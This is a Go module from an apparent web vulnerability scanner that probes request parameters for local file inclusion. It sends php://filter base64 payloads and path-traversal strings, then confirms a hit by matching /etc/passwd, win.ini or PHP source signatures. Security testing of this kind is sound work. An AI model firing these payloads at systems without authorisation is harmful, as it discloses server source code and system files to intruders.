package modules

import (
	"encoding/base64"
	"fmt"
	"nightfalllx/pkg/client"
	"nightfalllx/pkg/wordlists"
	"regexp"
	"strings"
)

type LFIModule struct{}

func NewLFIModule() *LFIModule {
	return &LFIModule{}
}

func (m *LFIModule) Name() string {
	return "lfi"
}

func (m *LFIModule) Description() string {
	return "Local File Inclusion and Path Traversal verification"
}

var (
	rootPasswdRegex = regexp.MustCompile(`root:[^:]*?:0:0:`)
	winIniRegex     = regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)
	base64BlobRegex = regexp.MustCompile(`[A-Za-z0-9+/]{20,}={0,2}`)
)

func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	for _, param := range target.Parameters() {
		origVal := target.Params[param]
		if isPost {
			origVal = target.Data[param]
		}
		if origVal == "" {
			origVal = "index"
		}

		// Baseline request to ensure indicators are not already present on documentation/tutorial pages
		var baseResp *client.Response
		var baseErr error
		if isPost {
			baseResp, baseErr = c.Request("POST", target.URL, target.BuildDataWithParam(param, origVal), nil)
		} else {
			baseResp, baseErr = c.Request("GET", target.BuildURLWithParam(param, origVal), "", nil)
		}
		baseBody := ""
		if baseErr == nil && baseResp != nil {
			baseBody = baseResp.Body
		}

		// 1. PHP Filter checks (both with and without .php for appended extensions)
		phpFilters := []string{
			"php://filter/convert.base64-encode/resource=index.php",
			"php://filter/convert.base64-encode/resource=index",
			"php://filter/read=convert.base64-encode/resource=index.php",
			"php://filter/read=convert.base64-encode/resource=index",
		}
		for _, phpFilterPayload := range phpFilters {
			var filterResp *client.Response
			var err error
			if isPost {
				filterResp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, phpFilterPayload), nil)
			} else {
				filterResp, err = c.Request("GET", target.BuildURLWithParam(param, phpFilterPayload), "", nil)
			}

			if err == nil && filterResp != nil && filterResp.Body != "" {
				blobs := base64BlobRegex.FindAllString(filterResp.Body, -1)
				for _, blob := range blobs {
					padded := blob + strings.Repeat("=", (4-len(blob)%4)%4)
					decoded, decErr := base64.StdEncoding.DecodeString(padded)
					if decErr == nil && (strings.Contains(string(decoded), "<?php") || strings.Contains(string(decoded), "<?=")) {
						findings = append(findings, &Finding{
							Module:      m.Name(),
							Title:       "Local File Inclusion (PHP Stream Filter)",
							Severity:    SeverityHigh,
							Confidence:  100,
							URL:         target.URL,
							Parameter:   param,
							Payload:     phpFilterPayload,
							Detail:      "PHP source code disclosure confirmed via php://filter base64 stream wrapper.",
							Evidence:    "Decoded base64 stream contained PHP script markers (<?php).",
							Remediation: "Disable PHP stream wrappers in user-controlled file inclusion and validate against an allow-list.",
							CWEID:       98,
						})
						break
					}
				}
			}
			if len(findings) > 0 {
				break
			}
		}

		if len(findings) > 0 {
			continue
		}

		// 2. Comprehensive Path Traversal checks from wordlists
		for _, item := range wordlists.LFITraversalPayloads {
			// Skip if baseline already contains this pattern
			if item.Regex.MatchString(baseBody) {
				continue
			}

			var resp *client.Response
			var err error
			if isPost {
				resp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, item.Path), nil)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, item.Path), "", nil)
			}
			if err != nil || resp == nil || resp.Body == "" {
				continue
			}

			if item.Regex.MatchString(resp.Body) {
				evidence := item.Regex.FindString(resp.Body)
				findings = append(findings, &Finding{
					Module:      m.Name(),
					Title:       "Path Traversal / Local File Inclusion (LFI)",
					Severity:    SeverityHigh,
					Confidence:  100,
					URL:         target.URL,
					Parameter:   param,
					Payload:     item.Path,
					Detail:      fmt.Sprintf("Arbitrary file read confirmed: disclosed known operating system file via payload '%s'.", item.Path),
					Evidence:    fmt.Sprintf("Matched signature in response: '%s'", evidence),
					Remediation: "Sanitize file paths, avoid passing raw user input into file systems, and restrict permissions.",
					CWEID:       22,
				})
				break
			}
		}
	}

	return findings, nil
}
